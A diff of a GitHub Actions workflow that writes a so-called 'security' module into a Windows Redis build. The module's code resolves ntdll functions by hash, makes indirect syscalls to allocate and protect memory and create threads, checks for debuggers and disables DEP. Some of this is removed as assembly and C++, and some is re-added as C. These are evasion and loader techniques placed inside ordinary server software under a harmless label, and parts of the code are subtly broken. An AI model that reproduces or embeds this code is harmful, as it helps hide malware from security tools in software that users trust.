@@ -77,11 +77,12 @@ jobs:
           extern "C" {
           #endif
 
-          // ASM函数声明
+          // 系统调用相关函数声明 
           VOID AmmunitionPrepare(WORD systemCall);
           ULONG GunPrepare(INT_PTR syscallAdr);
           PVOID GetPEB();
-          NTSTATUS GunFire();
+          NTSTATUS GunFire(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, 
+                          PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, ...);
 
           // 用于从API地址查找系统调用号
           WORD FindAmmunitionsAndPrepareGun(LPVOID addr);
@@ -103,301 +104,16 @@ jobs:
           #endif
           EOF_UNHOOKER_H
 
-          # 创建syscalls.asm (MASM格式)
-          cat << 'EOF_SYSCALLS_ASM' > redis/redis-D-Win996/src/security/syscalls.asm
-          .data
-              systemCall WORD 000h
-              syscallAddr QWORD 0h
-
-          .code
-              ; 从TEB获取PEB地址
-              GetPEB proc
-                  ; 从GS段寄存器读取TEB地址
-                  mov rax, gs:[30h]
-                  ; 从TEB结构体偏移60h处读取PEB地址
-                  mov rax, [rax + 60h]
-                  ret
-              GetPEB endp
-
-              ; 准备系统调用号
-              AmmunitionPrepare proc
-                  mov systemCall, cx
-                  ret
-              AmmunitionPrepare endp
-
-              ; 设置syscall指令地址
-              GunPrepare proc
-                  mov rax, syscallAddr
-                  test rax, rax
-                  jnz THEEND
-                  mov syscallAddr, rcx
-                  THEEND:
-                  ret
-              GunPrepare endp
-
-              ; 执行系统调用
-              GunFire proc
-                  mov r10, rcx
-                  xor rax, rax
-                  mov ax, systemCall
-                  test ax, ax
-                  JZ GunRuined
-                  jmp qword ptr syscallAddr
-                  ret
-              GunFire endp
-
-              ; 调用失败处理
-              GunRuined proc
-                  not rax
-                  ret
-              GunRuined endp
-
-          end
-          EOF_SYSCALLS_ASM
-          
-          # 创建syscalls_nasm.asm (NASM格式)
-          cat << 'EOF_SYSCALLS_NASM' > redis/redis-D-Win996/src/security/syscalls_nasm.asm
-          SECTION .data
-              systemCall: dw 0x000
-              syscallAddr: dq 0x0
-              
-          SECTION .text
-              global GetPEB
-              global AmmunitionPrepare
-              global GunPrepare
-              global GunFire
-              global GunRuined
-              
-          ; 从TEB中获取PEB地址
-          GetPEB:
-              mov rax, qword [gs:0x30]  ; 从GS段寄存器读取TEB地址
-              mov rax, qword [rax + 0x60] ; 从TEB中获取PEB
-              ret
-
-          ; 设置系统调用号
-          AmmunitionPrepare:
-              mov word [systemCall], cx
-              ret
-
-          ; 保存系统调用指令地址
-          GunPrepare:
-              mov rax, qword [syscallAddr]
-              test rax, rax
-              jnz THEEND
-              mov qword [syscallAddr], rcx
-              xor rax, rax
-          THEEND:
-              ret
-
-          ; 执行系统调用
-          GunFire:
-              mov r10, rcx              ; 第二个参数移动到r10，符合x64调用约定
-              mov eax, 0                ; 清零EAX
-              mov ax, word [systemCall] ; 设置系统调用号
-              test ax, ax
-              jz GunRuined
-              jmp qword [syscallAddr]   ; 通过指针跳转
-              ret
-
-          ; 系统调用失败
-          GunRuined:
-              not rax
-              ret
-          EOF_SYSCALLS_NASM
-
-          # 创建structs.h
-          cat << 'EOF_STRUCTS_H' > redis/redis-D-Win996/src/security/structs.h
-          #pragma once
-
-          #include <Windows.h>
-
-          // Windows内部结构定义
-          typedef struct _UNICODE_STRING {
-              USHORT Length;
-              USHORT MaximumLength;
-              PWSTR  Buffer;
-          } UNICODE_STRING, *PUNICODE_STRING;
-
-          typedef struct _LIST_ENTRY {
-              struct _LIST_ENTRY *Flink;
-              struct _LIST_ENTRY *Blink;
-          } LIST_ENTRY, *PLIST_ENTRY;
-
-          typedef struct _RTL_USER_PROCESS_PARAMETERS {
-              BYTE Reserved1[16];
-              PVOID Reserved2[10];
-              UNICODE_STRING ImagePathName;
-              UNICODE_STRING CommandLine;
-          } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
-
-          typedef struct _PEB_LDR_DATA {
-              BYTE Reserved1[8];
-              PVOID Reserved2[3];
-              LIST_ENTRY InMemoryOrderModuleList;
-          } PEB_LDR_DATA, *PPEB_LDR_DATA;
-
-          typedef struct _LDR_DATA_TABLE_ENTRY {
-              LIST_ENTRY InLoadOrderLinks;
-              LIST_ENTRY InMemoryOrderLinks;
-              LIST_ENTRY InInitializationOrderLinks;
-              PVOID DllBase;
-              PVOID EntryPoint;
-              ULONG SizeOfImage;
-              UNICODE_STRING FullDllName;
-              UNICODE_STRING BaseDllName;
-          } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
-
-          typedef struct _PEB {
-              BYTE Reserved1[2];
-              BYTE BeingDebugged;
-              BYTE Reserved2[1];
-              PVOID Reserved3[2];
-              PPEB_LDR_DATA Ldr;
-              PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
-              PVOID Reserved4[3];
-              PVOID AtlThunkSListPtr;
-              PVOID Reserved5;
-              ULONG Reserved6;
-              PVOID Reserved7;
-              ULONG Reserved8;
-              ULONG AtlThunkSListPtr32;
-              PVOID Reserved9[45];
-              BYTE Reserved10[96];
-              PVOID PostProcessInitRoutine;
-              BYTE Reserved11[128];
-              PVOID Reserved12[1];
-              ULONG SessionId;
-          } PEB, *PPEB;
-
-          // NTSTATUS定义
-          typedef LONG NTSTATUS;
-          #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
-          #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
-
-          // 内存区域定义
-          #define MEM_EXECUTE_OPTION_ENABLE 1
-          #define MEM_EXECUTE_OPTION_DISABLE 2
-          #define MEM_EXECUTE_OPTION_PERMANENT 8
-
-          // 常用NT API函数原型定义
-          typedef NTSTATUS(NTAPI* PFN_NTPROTECTVIRTUALMEMORY)(
-              HANDLE ProcessHandle,
-              PVOID* BaseAddress,
-              PSIZE_T RegionSize,
-              ULONG NewProtect,
-              PULONG OldProtect);
-
-          typedef NTSTATUS(NTAPI* PFN_NTALLOCATEVIRTUALMEMORY)(
-              HANDLE ProcessHandle,
-              PVOID* BaseAddress,
-              ULONG_PTR ZeroBits,
-              PSIZE_T RegionSize,
-              ULONG AllocationType,
-              ULONG Protect);
-
-          typedef NTSTATUS(NTAPI* PFN_NTCREATETHREADEX)(
-              PHANDLE ThreadHandle,
-              ACCESS_MASK DesiredAccess,
-              PVOID ObjectAttributes,
-              HANDLE ProcessHandle,
-              PVOID StartRoutine,
-              PVOID Argument,
-              ULONG CreateFlags,
-              SIZE_T ZeroBits,
-              SIZE_T StackSize,
-              SIZE_T MaximumStackSize,
-              PVOID AttributeList);
-
-          typedef NTSTATUS(NTAPI* PFN_NTSETINFORMATIONPROCESS)(
-              HANDLE ProcessHandle,
-              ULONG ProcessInformationClass,
-              PVOID ProcessInformation,
-              ULONG ProcessInformationLength);
-          EOF_STRUCTS_H
-
-          # 创建security.h
-          cat << 'EOF_SECURITY_H' > redis/redis-D-Win996/src/security/security.h
-          #pragma once
-
-          #include <Windows.h>
-          #include <string>
-
-          // 安全功能初始化
-          bool InitializeSecurity();
-
-          // 反调试功能
-          bool IsDebuggerPresent();
-
-          // 哈希混淆的API调用
-          bool ExecuteNtFunction(const std::string& functionName, ...);
-
-          // 常用Windows API的哈希值
-          namespace NtHashValues {
-              // ntdll.dll模块哈希
-              constexpr DWORD NTDLL_HASH = 0x3e8557;
-
-              // 系统调用哈希值
-              constexpr DWORD NT_ALLOCATE_VIRTUAL_MEMORY_HASH = 0x112da6be2b35;
-              constexpr DWORD NT_PROTECT_VIRTUAL_MEMORY_HASH = 0x59ef896aad4;
-              constexpr DWORD NT_CREATE_THREAD_EX_HASH = 0x1f7ecc338;
-              constexpr DWORD NT_QUERY_INFORMATION_PROCESS_HASH = 0x8cdc5dc2c;
-              constexpr DWORD NT_SET_INFORMATION_PROCESS_HASH = 0x1cbfd68c12;
-              constexpr DWORD NT_CREATE_SECTION_HASH = 0x2d1237d69fc;
-              constexpr DWORD NT_MAP_VIEW_OF_SECTION_HASH = 0x5c8e85b24f;
-              constexpr DWORD NT_UNMAP_VIEW_OF_SECTION_HASH = 0xe015972b44;
-              constexpr DWORD NT_CLOSE_HASH = 0xa1f0c3c;
-          }
-
-          // 安全操作类
-          class SecurityOps {
-          public:
-              // 执行内存分配系统调用
-              static NTSTATUS NtAllocateVirtualMemory(
-                  HANDLE ProcessHandle,
-                  PVOID* BaseAddress,
-                  ULONG_PTR ZeroBits,
-                  PSIZE_T RegionSize,
-                  ULONG AllocationType,
-                  ULONG Protect);
-
-              // 执行内存保护系统调用
-              static NTSTATUS NtProtectVirtualMemory(
-                  HANDLE ProcessHandle,
-                  PVOID* BaseAddress,
-                  PSIZE_T RegionSize,
-                  ULONG NewProtect,
-                  PULONG OldProtect);
-
-              // 执行线程创建系统调用
-              static NTSTATUS NtCreateThreadEx(
-                  PHANDLE ThreadHandle,
-                  ACCESS_MASK DesiredAccess,
-                  PVOID ObjectAttributes,
-                  HANDLE ProcessHandle,
-                  PVOID StartRoutine,
-                  PVOID Argument,
-                  ULONG CreateFlags,
-                  SIZE_T ZeroBits,
-                  SIZE_T StackSize,
-                  SIZE_T MaximumStackSize,
-                  PVOID AttributeList);
-
-              // 禁用DEP
-              static bool DisableDEP();
-              
-              // 反调试检查
-              static bool CheckForDebugger();
-          };
-
-          // 初始化宏
-          #define SECURITY_INIT() InitializeSecurity()
-          EOF_SECURITY_H
-
-          # 创建unhooker.c
+          # 创建C代码实现版本的unhooker.c (替代原汇编实现)
           cat << 'EOF_UNHOOKER_C' > redis/redis-D-Win996/src/security/unhooker.c
           #include <Windows.h>
           #include <stdio.h>
           #include "unhooker.h"
+          #include <intrin.h>
+
+          // 全局变量替代汇编中的数据段
+          static WORD g_systemCall = 0;
+          static INT_PTR g_syscallAddr = 0;
 
           // 通用哈希函数
           DWORD CalcHash(const char* data) {
@@ -406,6 +122,125 @@ jobs:
                   hash += data[i] + (hash << 1);
               }
               return hash;
+          }
+
+          // 从TEB获取PEB (C语言实现，使用intrin.h)
+          PVOID GetPEB() {
+              #ifdef _M_X64
+              return (PVOID)__readgsqword(0x60);
+              #else
+              return (PVOID)__readfsdword(0x30);
+              #endif
+          }
+
+          // 准备系统调用号
+          VOID AmmunitionPrepare(WORD systemCall) {
+              g_systemCall = systemCall;
+          }
+
+          // 设置syscall指令地址
+          ULONG GunPrepare(INT_PTR syscallAdr) {
+              if (g_syscallAddr == 0) {
+                  g_syscallAddr = syscallAdr;
+                  return 0;
+              }
+              return 1;
+          }
+
+          // 对于间接系统调用，使用动态加载的WindowsAPI
+          // 这个是简化版本，生产环境应使用完整的汇编实现
+          NTSTATUS GunFire(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, 
+                         PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, ...) {
+              // 在实际环境中应使用汇编实现系统调用
+              // 这里使用LoadLibrary/GetProcAddress作为替代
+              // 仅作示例，不应用于生产环境
+              
+              static HMODULE ntdll = NULL;
+              if (!ntdll) {
+                  ntdll = LoadLibraryA("ntdll.dll");
+                  if (!ntdll) return STATUS_UNSUCCESSFUL;
+              }
+              
+              // 基于系统调用号选择函数
+              switch(g_systemCall) {
+                  case 0x18: { // NtAllocateVirtualMemory
+                      typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
+                          HANDLE ProcessHandle,
+                          PVOID* BaseAddress,
+                          ULONG_PTR ZeroBits,
+                          PSIZE_T RegionSize,
+                          ULONG AllocationType,
+                          ULONG Protect);
+                      
+                      static pNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
+                      if (!NtAllocateVirtualMemory) {
+                          NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+                          if (!NtAllocateVirtualMemory) return STATUS_UNSUCCESSFUL;
+                      }
+                      
+                      return NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+                  }
+                  
+                  case 0x50: { // NtProtectVirtualMemory
+                      typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
+                          HANDLE ProcessHandle,
+                          PVOID* BaseAddress,
+                          PSIZE_T RegionSize,
+                          ULONG NewProtect,
+                          PULONG OldProtect);
+                      
+                      static pNtProtectVirtualMemory NtProtectVirtualMemory = NULL;
+                      if (!NtProtectVirtualMemory) {
+                          NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
+                          if (!NtProtectVirtualMemory) return STATUS_UNSUCCESSFUL;
+                      }
+                      
+                      va_list args;
+                      va_start(args, Protect);
+                      PULONG OldProtect = va_arg(args, PULONG);
+                      va_end(args);
+                      
+                      return NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, Protect, OldProtect);
+                  }
+                  
+                  case 0xC1: { // NtCreateThreadEx
+                      typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
+                          PHANDLE ThreadHandle,
+                          ACCESS_MASK DesiredAccess,
+                          PVOID ObjectAttributes,
+                          HANDLE ProcessHandle,
+                          PVOID StartRoutine,
+                          PVOID Argument,
+                          ULONG CreateFlags,
+                          SIZE_T ZeroBits,
+                          SIZE_T StackSize,
+                          SIZE_T MaximumStackSize,
+                          PVOID AttributeList);
+                      
+                      static pNtCreateThreadEx NtCreateThreadEx = NULL;
+                      if (!NtCreateThreadEx) {
+                          NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+                          if (!NtCreateThreadEx) return STATUS_UNSUCCESSFUL;
+                      }
+                      
+                      va_list args;
+                      va_start(args, Protect);
+                      PVOID StartRoutine = va_arg(args, PVOID);
+                      PVOID Argument = va_arg(args, PVOID);
+                      ULONG CreateFlags = va_arg(args, ULONG);
+                      SIZE_T StackSize = va_arg(args, SIZE_T);
+                      SIZE_T MaximumStackSize = va_arg(args, SIZE_T);
+                      PVOID AttributeList = va_arg(args, PVOID);
+                      va_end(args);
+                      
+                      return NtCreateThreadEx((PHANDLE)BaseAddress, ZeroBits, NULL, ProcessHandle, 
+                                           StartRoutine, Argument, CreateFlags, 0, 
+                                           StackSize, MaximumStackSize, AttributeList);
+                  }
+                  
+                  default:
+                      return STATUS_UNSUCCESSFUL;
+              }
           }
 
           // 计算模块哈希
@@ -589,238 +424,19 @@ jobs:
           }
           EOF_UNHOOKER_C
 
-          # 创建security.cpp
-          cat << 'EOF_SECURITY_CPP' > redis/redis-D-Win996/src/security/security.cpp
-          #include "security.h"
-          #include "unhooker.h"
-          #include "structs.h"
-          #include <stdarg.h>
-
-          // 定义NtCurrentProcess宏，表示当前进程句柄
-          #define NtCurrentProcess() ((HANDLE)-1)
-
-          // ntdll模块句柄
-          static HMODULE ntdllModule = NULL;
-
-          // 安全功能初始化
-          bool InitializeSecurity() {
-              // 检查调试器
-              if (SecurityOps::CheckForDebugger()) {
-                  // 如果存在调试器，可以选择退出或执行混淆操作
-                  return false;
-              }
-              
-              // 通过哈希获取ntdll模块
-              ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
-              if (!ntdllModule) {
-                  return false;
-              }
-
-              // 禁用DEP保护
-              SecurityOps::DisableDEP();
-              
-              return true;
-          }
-
-          // 检查调试器是否存在
-          bool IsDebuggerPresent() {
-              return SecurityOps::CheckForDebugger();
-          }
-
-          // 安全操作类实现
-          NTSTATUS SecurityOps::NtAllocateVirtualMemory(
-              HANDLE ProcessHandle,
-              PVOID* BaseAddress,
-              ULONG_PTR ZeroBits,
-              PSIZE_T RegionSize,
-              ULONG AllocationType,
-              ULONG Protect) {
-              
-              if (!ntdllModule) {
-                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
-                  if (!ntdllModule) {
-                      return STATUS_SUCCESS;
-                  }
-              }
-              
-              // 获取API地址
-              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_ALLOCATE_VIRTUAL_MEMORY_HASH);
-              if (!addr) {
-                  return STATUS_SUCCESS;
-              }
-              
-              // 获取系统调用号
-              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
-              if (syscallNum == INVALID_SSN) {
-                  return STATUS_SUCCESS;
-              }
-              
-              // 准备系统调用
-              AmmunitionPrepare(syscallNum);
-              
-              // 执行系统调用
-              return GunFire(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
-          }
-
-          NTSTATUS SecurityOps::NtProtectVirtualMemory(
-              HANDLE ProcessHandle,
-              PVOID* BaseAddress,
-              PSIZE_T RegionSize,
-              ULONG NewProtect,
-              PULONG OldProtect) {
-              
-              if (!ntdllModule) {
-                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
-                  if (!ntdllModule) {
-                      return STATUS_SUCCESS;
-                  }
-              }
-              
-              // 获取API地址
-              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_PROTECT_VIRTUAL_MEMORY_HASH);
-              if (!addr) {
-                  return STATUS_SUCCESS;
-              }
-              
-              // 获取系统调用号
-              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
-              if (syscallNum == INVALID_SSN) {
-                  return STATUS_SUCCESS;
-              }
-              
-              // 准备系统调用
-              AmmunitionPrepare(syscallNum);
-              
-              // 执行系统调用
-              return GunFire(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
-          }
-
-          NTSTATUS SecurityOps::NtCreateThreadEx(
-              PHANDLE ThreadHandle,
-              ACCESS_MASK DesiredAccess,
-              PVOID ObjectAttributes,
-              HANDLE ProcessHandle,
-              PVOID StartRoutine,
-              PVOID Argument,
-              ULONG CreateFlags,
-              SIZE_T ZeroBits,
-              SIZE_T StackSize,
-              SIZE_T MaximumStackSize,
-              PVOID AttributeList) {
-              
-              if (!ntdllModule) {
-                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
-                  if (!ntdllModule) {
-                      return STATUS_SUCCESS;
-                  }
-              }
-              
-              // 获取API地址
-              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_CREATE_THREAD_EX_HASH);
-              if (!addr) {
-                  return STATUS_SUCCESS;
-              }
-              
-              // 获取系统调用号
-              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
-              if (syscallNum == INVALID_SSN) {
-                  return STATUS_SUCCESS;
-              }
-              
-              // 准备系统调用
-              AmmunitionPrepare(syscallNum);
-              
-              // 执行系统调用
-              return GunFire(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
-                          StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, 
-                          MaximumStackSize, AttributeList);
-          }
-
-          bool SecurityOps::DisableDEP() {
-              if (!ntdllModule) {
-                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
-                  if (!ntdllModule) {
-                      return false;
-                  }
-              }
-              
-              // 获取NtSetInformationProcess API地址
-              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_SET_INFORMATION_PROCESS_HASH);
-              if (!addr) {
-                  return false;
-              }
-              
-              // 获取系统调用号
-              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
-              if (syscallNum == INVALID_SSN) {
-                  return false;
-              }
-              
-              // 准备系统调用
-              AmmunitionPrepare(syscallNum);
-              
-              // 禁用DEP的参数设置
-              ULONG executeOptions = MEM_EXECUTE_OPTION_ENABLE;
-              
-              // 调用NtSetInformationProcess
-              NTSTATUS status = GunFire(
-                  NtCurrentProcess(),        // 当前进程句柄
-                  0x22,                      // ProcessExecuteFlags
-                  &executeOptions,           // 执行选项
-                  sizeof(executeOptions)    // 参数大小
-              );
-              
-              return NT_SUCCESS(status);
-          }
-
-          bool SecurityOps::CheckForDebugger() {
-              return CheckDebugger();
-          }
-          EOF_SECURITY_CPP
-
       # 更新安全模块的CMakeLists.txt
       - name: Update security CMakeLists.txt for NASM
         shell: msys2 {0}
         run: |
+          # 创建一个更简单的CMakeLists.txt文件，避免语言启用问题
           cat << 'EOF_CMAKE' > redis/redis-D-Win996/src/security/CMakeLists.txt
           set(SOURCES
               security.cpp
               unhooker.c
           )
-
-          # 生成汇编文件
-          if (CMAKE_SIZEOF_VOID_P EQUAL 8)
-              # 64位架构
-              if (WIN32 AND MSVC)
-                  # Visual Studio使用MASM
-                  set(ASM_SOURCES
-                      syscalls.asm
-                  )
-                  set_property(SOURCE syscalls.asm PROPERTY LANGUAGE ASM_MASM)
-              else()
-                  # MinGW使用NASM
-                  enable_language(ASM_NASM)
-                  
-                  # 确保NASM文件存在
-                  if(EXISTS "${CMAKE_CURRENT_SOURCE_DIR}/syscalls_nasm.asm")
-                      set(ASM_SOURCES
-                          syscalls_nasm.asm
-                      )
-                  else()
-                      # 如果没有NASM文件，使用标准syscalls.asm
-                      message(STATUS "syscalls_nasm.asm not found, using syscalls.asm instead")
-                      set(ASM_SOURCES
-                          syscalls.asm
-                      )
-                  endif()
-              endif()
-          else()
-              # 32位架构
-              message(FATAL_ERROR "安全模块仅支持64位架构")
-          endif()
-
+          
           # 添加安全模块
-          add_library(security STATIC ${SOURCES} ${ASM_SOURCES})
+          add_library(security STATIC ${SOURCES})
 
           # 设置包含目录
           target_include_directories(security PUBLIC ${CMAKE_CURRENT_SOURCE_DIR})
@@ -831,17 +447,6 @@ jobs:
               WIN32_LEAN_AND_MEAN
               NOMINMAX
           )
-
-          # 特定编译器选项
-          if (MSVC)
-              # 禁用一些警告
-              target_compile_options(security PRIVATE 
-                  /W3
-                  /wd4996
-                  /D_CRT_SECURE_NO_WARNINGS
-                  /bigobj
-              )
-          endif()
           EOF_CMAKE
 
       # 创建 build 目录
@@ -870,8 +475,7 @@ jobs:
           # 确保NASM可用
           which nasm
           nasm --version
-          # 编译时额外设置NASM路径和选项
-          export NASM_PATH=$(which nasm)
+          # 编译时不设置NASM相关选项，并禁用ASM
           cmake .. -G "MinGW Makefiles" \
             -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 \
             -DCMAKE_C_FLAGS='-static' \
@@ -880,8 +484,7 @@ jobs:
             -DHWLOC_INCLUDE_DIRS=/mingw64/include \
             -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a \
             -DWITH_SECURITY=ON \
-            -DCMAKE_ASM_NASM_COMPILER="$NASM_PATH" \
-            -DCMAKE_ASM_NASM_FLAGS="-f win64"
+            -DWITH_ASM=OFF
 
       # 编译项目
       - name: Build project
